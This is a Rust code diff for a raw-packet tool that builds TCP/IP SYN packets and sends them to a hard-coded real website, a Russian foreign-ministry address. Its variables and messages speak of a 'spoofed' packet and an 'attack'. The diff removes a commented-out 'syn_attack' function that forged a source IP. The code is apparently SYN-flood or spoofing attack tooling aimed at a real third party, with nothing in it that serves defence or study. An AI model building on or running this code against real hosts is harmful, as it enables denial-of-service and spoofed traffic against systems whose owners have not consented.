@@ -4,33 +4,32 @@ use std::net::Ipv4Addr;
 use std::net::TcpListener;
 use std::io::Error;
 use std::net::{SocketAddr, ToSocketAddrs};
+use std::thread;
+use std::time::Duration;
 use pnet::datalink::NetworkInterface;
+use pnet::datalink::{self, Channel::Ethernet};
+use pnet::packet::ethernet::EthernetPacket;
 use pnet::packet::PacketSize;
 use pnet::packet::Packet;
 use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::packet::ipv4::{Ipv4Packet, MutableIpv4Packet, Ipv4Flags};
 use pnet::packet::tcp::{MutableTcpPacket, TcpPacket};
 use pnet::packet::tcp::TcpFlags;
-use pnet::datalink;
 use ipconfig::get_adapters;
 use ipconfig::OperStatus;
-use socket2::{Socket, SockAddr, Domain, Type, Protocol};
 use rand::Rng;
 use std::convert::TryInto;
 use url::Url;
-use std::io::{self};
-use std::time::{Duration, Instant};
-use std::mem::MaybeUninit;
 
 fn main() {
     let domain = "https://peru.mid.ru/ru/";
-    let syn_test_result: Result<(), Error> = syn_test(domain);
+    let _syn_result: Result<(), Error> = syn_test(domain);
     println!("Execution completed.");
 }
 
 fn syn_test(domain: &str) -> Result<(), Error>{
 
-    //Find default adapter ip
+    //Find default adapter
     let active_adapter: NetworkInterface;
     if cfg!(target_os = "windows"){
         active_adapter = find_active_adapter_ip_windows()
@@ -39,6 +38,8 @@ fn syn_test(domain: &str) -> Result<(), Error>{
     } else {
         panic!("Failed to assess operating system, what are you running?");
     }
+
+    //Find ip of default adapter
     let source_ip: Ipv4Addr = active_adapter.ips.iter()
     .filter_map(|ip_network| match ip_network.ip() {
         IpAddr::V4(ipv4_addr) => Some(ipv4_addr),
@@ -46,7 +47,7 @@ fn syn_test(domain: &str) -> Result<(), Error>{
     })
     .next().unwrap();
     
-    //Find target ip
+    //Find ip of target
     let host_name: String; 
     match extract_hostname(domain) {
         Some(hostname) => {host_name = hostname},
@@ -54,44 +55,26 @@ fn syn_test(domain: &str) -> Result<(), Error>{
     }
     let target_ip: Ipv4Addr = resolve_host(&host_name);
     
-    //Generate syn packet
+    //Generate TCP/IP SYN packet
     let mut syn_packet_buffer: [u8; 20] = [0u8; 20];
     let mut ip_packet_buffer: [u8; 40] = [0u8; 40];
     let syn_request_details: (TcpPacket, u16) = generate_syn_packet(source_ip, target_ip, &mut syn_packet_buffer);
     let syn_request_packet: TcpPacket = syn_request_details.0;
     let source_port: u16 = syn_request_details.1;
-    let spoofed_ip_packet: Ipv4Packet = generate_ip_packet(source_ip, target_ip, &mut ip_packet_buffer, syn_request_packet);
+    let spoofed_ip_packet: Ipv4Packet = generate_ip_packet(source_ip, target_ip, &mut ip_packet_buffer, &syn_request_packet);
 
     //Send the request
-    let _success: Result<Vec<MaybeUninit<u8>>, Error> = syn_request_and_listen(spoofed_ip_packet, source_ip, source_port, target_ip);
+    syn_request_and_listen(spoofed_ip_packet, active_adapter, source_ip, source_port, target_ip);
 
     Ok(())
 
 }
 
-/*fn syn_attack(domain: &str) -> Result<(), Error>{
-    let host_name: String; 
-    match extract_hostname(domain) {
-        Some(hostname) => {host_name = hostname},
-        None => panic!("Invalid URL or hostname not found"),
-    }
-    let target_ip: Ipv4Addr = resolve_host(&host_name);
-    let source_ip: Ipv4Addr = Ipv4Addr::new(192, 168, 0, 1);
-    let mut syn_packet_buffer: [u8; 20] = [0u8; 20];
-    let mut ip_packet_buffer: [u8; 40] = [0u8; 40];
-    let syn_request_packet: TcpPacket = generate_syn_packet(source_ip, target_ip, &mut syn_packet_buffer).0;
-    let spoofed_ip_packet: Ipv4Packet = generate_ip_packet(source_ip, target_ip, &mut ip_packet_buffer, syn_request_packet);
-    let _success: Result<(), Error> = https_syn_request(spoofed_ip_packet, target_ip);
-    println!("SYN request sent to {:?}", domain);
-    Ok(())
-}*/
 
-fn syn_request_and_listen(packet: Ipv4Packet, source_ip: Ipv4Addr, source_port: u16, target_ip: Ipv4Addr) -> Result<Vec<MaybeUninit<u8>>, Error> {
+fn syn_request_and_listen(packet: Ipv4Packet, interface: NetworkInterface, source_ip: Ipv4Addr, source_port: u16, target_ip: Ipv4Addr) -> () {
 
     //assemble details
     let source_addr_string: String = format!("{}:{}", source_ip, source_port);
-    let socket: Socket = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::TCP)).expect("Failed to create socket");
-    let socket_raw: Socket = Socket::new_raw(Domain::IPV4, Type::RAW, Some(Protocol::TCP)).expect("Failed to create raw socket");
     let target_ip_string: String = target_ip.to_string();
     let target_addr_string: String = format!("{}:{}", target_ip_string, 443);
     let source: SocketAddr = source_addr_string.parse().expect("Unable to parse source address");
@@ -101,66 +84,43 @@ fn syn_request_and_listen(packet: Ipv4Packet, source_ip: Ipv4Addr, source_port: 
     println!("Source: {:?}", source);
     println!("Target: {:?}", target);
     print_packet_hex(packet.packet());
-    
-    //send
-    let packet_as_bytes: &[u8] = &packet.packet();
-    let socket_address: SocketAddr = target.into();
-    let socket_address_os: SockAddr = SockAddr::from(socket_address);
-    socket_raw.send_to(packet_as_bytes, &socket_address_os).expect("Failed to send SYN Request through socket");
-    println!("SYN request sent to {:?}", target);
-    
-    //listen
-    socket.set_nonblocking(true)?;
-    println!("socket set");
-    let timeout: Duration = Duration::from_secs(10);
-    let start: Instant = Instant::now();
-    println!("Starting unsafe..");
-    let mut buffer: [MaybeUninit<u8>; 4096] = unsafe { 
-        MaybeUninit::uninit().assume_init() 
+
+    let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
+        Ok(Ethernet(tx, rx)) => (tx, rx),
+        Ok(_) => panic!("Unhandled channel type"),
+        Err(e) => panic!("Error creating datalink channel: {}", e),
     };
-    println!("Finished second block");
+
+    match tx.send_to(packet.packet(), Some(interface)) {
+        Some(Ok(_)) => println!("SYN packet sent successfully."),
+        Some(Err(e)) => eprintln!("Failed to send SYN packet: {}", e),
+        None => panic!("Something weird's happened...")
+    }
 
     loop {
-        println!("entering loop");
-        let buffer_slice: &mut [MaybeUninit<u8>] = &mut buffer[..];
-        match socket.recv_from(buffer_slice) {
-            Ok((number_of_bytes, src_addr)) => {
-                println!("Received {} bytes from {:?}", number_of_bytes, src_addr);
-                let buffer_vec: Vec<MaybeUninit<u8>> = buffer_slice[..number_of_bytes].to_vec();
-                return Ok(buffer_vec);
-            },
-            Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
-                println!("Hit Err Block 1");
-                if start.elapsed() >= timeout {
-                    println!("Listening timed out");
-                    return Err(io::Error::new(io::ErrorKind::TimedOut, "Listening timed out"));
+        match rx.next() {
+            Ok(frame) => {
+                let frame = EthernetPacket::new(frame).unwrap();
+                if let Some(packet) = Ipv4Packet::new(frame.payload()) {
+                    if packet.get_next_level_protocol() == IpNextHeaderProtocols::Tcp {
+                        if let Some(tcp_packet) = TcpPacket::new(packet.payload()) {
+                            if tcp_packet.get_destination() == source_port &&
+                               tcp_packet.get_flags() & TcpFlags::SYN != 0 &&
+                               tcp_packet.get_flags() & TcpFlags::ACK != 0 {
+                                println!("Received SYN-ACK packet! {:?}", tcp_packet.packet());
+                                break;
+                            }
+                        }
+                    }
                 }
             },
             Err(e) => {
-                println!("Hit Err Block 2");
-                return Err(e);
+                eprintln!("An error occurred while reading: {}", e);
             }
         }
-        // Optional: sleep a bit to prevent the loop from consuming too much CPU
-        std::thread::sleep(std::time::Duration::from_millis(100));
+        thread::sleep(Duration::from_millis(25));
     }
-    
 
-}
-
-fn syn_request_and_drop(packet: Ipv4Packet, source_ip: Ipv4Addr, source_port: u16, target_ip: Ipv4Addr) -> Result<(), Error>{
-    let source_addr_string: String = format!("{}:{}", source_ip, source_port);
-    let socket: Socket = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::TCP)).expect("Failed to create socket");
-    let target_ip_string: String = target_ip.to_string();
-    let target_addr_string: String = format!("{}:{}", target_ip_string, 443);
-    let source: SocketAddr = source_addr_string.parse().expect("Unable to parse source address");
-    let target: SocketAddr = target_addr_string.parse().expect("Unable to parse target address");
-    println!("Source: {:?}", source);
-    println!("Target: {:?}", target);
-    print_packet_hex(packet.packet());
-    socket.send_to(packet.packet(), &target.into()).expect("Failed to send SYN Request through socket");
-    println!("SYN request sent to {:?}", target);
-    Ok(())
 }
 
 fn resolve_host(domain: &str) -> Ipv4Addr {
@@ -189,7 +149,7 @@ fn resolve_host(domain: &str) -> Ipv4Addr {
 
 }
 
-fn generate_ip_packet<'a>(source_ip: Ipv4Addr, target_ip: Ipv4Addr, buffer: &'a mut [u8], payload: TcpPacket) -> Ipv4Packet<'a> {
+fn generate_ip_packet<'a>(source_ip: Ipv4Addr, target_ip: Ipv4Addr, buffer: &'a mut [u8], payload: &TcpPacket) -> Ipv4Packet<'a> {
     {
         let mut packet = MutableIpv4Packet::new(buffer).unwrap();
         let payload_size: u16 = payload.packet_size().try_into().unwrap();
@@ -308,6 +268,8 @@ fn find_active_adapter_ip_windows() -> NetworkInterface {
     let ethernet_adapter = valid_adapters.iter().find(|adapter: &&(String, String, OperStatus)| adapter.0 == "Ethernet");
     let wifi_adapter = valid_adapters.iter().find(|adapter: &&(String, String, OperStatus)| adapter.0 == "WiFi");
     let result = ethernet_adapter.or(wifi_adapter);
+
+    println!("Adapter used for attack: {:?}", result.unwrap());
 
     let interfaces: Vec<datalink::NetworkInterface> = datalink::interfaces();
 
